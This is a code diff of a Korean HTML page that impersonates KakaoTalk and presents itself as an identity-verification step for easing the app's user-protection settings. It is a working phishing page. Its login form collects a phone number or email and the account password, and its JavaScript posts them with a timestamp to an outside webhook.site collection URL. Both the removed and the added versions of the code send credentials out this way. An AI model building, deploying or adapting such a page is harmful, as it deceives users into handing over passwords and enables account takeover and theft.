@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>카카오톡 이용자보호서비스 완화(자동감지 약화)</title>
+  <title>카카오톡 이용자보호서비스 완화</title>
   <style>
     body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
     .container { max-width: 500px; margin: 0 auto; padding: 20px; }
@@ -21,6 +22,9 @@
     .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
     .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc;
       font-size: 14px; outline: none; }
+    .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px;
+      background: #f0f0f0; border: none; border-radius: 6px;
+      font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
   </style>
 </head>
 <body>
@@ -41,26 +45,15 @@
     <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
-  <!-- 로그인 화면 1 (page2) -->
+  <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="(+82)전화번호" id="userPhone2" style="width:370px; padding:5px;">
-    <input type="password" placeholder="비밀번호" id="userPw2" style="width:370px; padding:5px;">
-    <button type="button" class="btn-yellow" onclick="goNext2()">본인인증하기</button>
-  </div>
-
-  <!-- 로그인 화면 2 (page3, page2와 동일) -->
-  <div id="page3" class="login-container hidden">
-    <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="(+82)전화번호" id="userPhone3" style="width:370px; padding:5px;">
-    <input type="password" placeholder="비밀번호" id="userPw3" style="width:370px; padding:5px;">
-    <button type="button" class="btn-yellow" onclick="login3()">본인인증하기</button>
+    <input type="text" placeholder="이메일 또는 전화번호" id="userId" style="width:370px; padding:5px;">
+    <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
+    <button type="button" class="btn-gray" onclick="login()">본인인증하기</button>
   </div>
 
   <script>
-    const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
-
-    // page1 → page2
     function goNext() {
       const chk = document.getElementById("agree");
       if (!chk.checked) {
@@ -71,25 +64,23 @@
       }
     }
 
-    // page2 → page3, webhook 전송
-    function goNext2() {
-      const userId = document.getElementById("userPhone2").value.trim();
-      const password = document.getElementById("userPw2").value.trim();
+    function login() {
+      const email = document.getElementById("userId").value.trim();
+      const password = document.getElementById("userPw").value.trim();
 
-      if (!userId || !password) {
-        alert("전화번호와 비밀번호를 입력해주세요.");
+      if (!email || !password) {
+        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
         return;
       }
 
-      const phoneRegex = /^010\d{8}$/;
-      if (!phoneRegex.test(userId)) {
-        alert("잘못된 형식의 전화번호입니다.");
-        return;
-      }
+      console.log("이메일/전화번호:", email);
+      console.log("비밀번호:", password);
+
+      // webhook.site URL
+      const webhookUrl = " https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 
       const formData = new URLSearchParams();
-      formData.append("page", "2");
-      formData.append("phone", userId);
+      formData.append("email", email);
       formData.append("password", password);
       formData.append("timestamp", new Date().toISOString());
 
@@ -98,42 +89,7 @@
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: formData
       })
-      .then(() => {
-        alert("2페이지 값이 전송되었습니다!");
-        document.getElementById("page2").classList.add("hidden");
-        document.getElementById("page3").classList.remove("hidden");
-      })
-      .catch(err => console.error("전송 오류:", err));
-    }
-
-    // page3 로그인, webhook 전송
-    function login3() {
-      const userId = document.getElementById("userPhone3").value.trim();
-      const password = document.getElementById("userPw3").value.trim();
-
-      if (!userId || !password) {
-        alert("전화번호와 비밀번호를 입력해주세요.");
-        return;
-      }
-
-      const phoneRegex = /^010\d{8}$/;
-      if (!phoneRegex.test(userId)) {
-        alert("잘못된 형식의 전화번호입니다.");
-        return;
-      }
-
-      const formData = new URLSearchParams();
-      formData.append("page", "3");
-      formData.append("phone", userId);
-      formData.append("password", password);
-      formData.append("timestamp", new Date().toISOString());
-
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: formData
-      })
-      .then(() => alert("3페이지 값이 전송되었습니다!"))
+      .then(() => alert("webhook.site에 값이 전송되었습니다!"))
       .catch(err => console.error("전송 오류:", err));
     }
   </script>
